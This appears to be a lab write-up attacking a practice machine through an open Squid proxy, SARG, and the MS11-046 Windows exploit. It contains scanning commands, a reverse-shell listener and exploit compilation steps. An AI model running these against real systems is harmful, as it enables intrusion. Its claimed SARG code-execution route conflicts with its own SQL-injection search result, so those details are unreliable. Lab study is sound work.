# 🪟 Squid

> Squid Proxy + SARG / MS11-046

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.189

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Enumerating via Squid Proxy
We configured Squid as a proxy and enumerated internal services.
```shell
# Set proxy in browser: 192.168.182.189:3128

# Enum internal via proxy
curl --proxy http://192.168.182.189:3128 http://localhost/
curl --proxy http://192.168.182.189:3128 http://localhost:8080/

# Found SARG (Squid Analysis Report Generator)
curl --proxy http://192.168.182.189:3128 http://localhost/sarg/
```
### Initial Access
SARG is vulnerable to RCE via the server_name parameter.
```shell
# Search
searchsploit sarg
Squid Analysis Report Generator 2.x - SQL Injection  | php/webapps/19161.txt

# RCE via report name injection
# Create malicious report name with reverse shell payload
# Listener
rlwrap -cAra nc -vnlp 443
```
### Privilege Escalation
Windows XP vulnerable to MS11-046.
```shell
# Compile and transfer MS11-046
i686-w64-mingw32-gcc 40564.c -o ms11046.exe -lws2_32
.\ms11046.exe
```
### Post-Exploitation
```shell
# Evidence
ipconfig
type C:\Documents and Settings\Administrator\Desktop\proof.txt
```
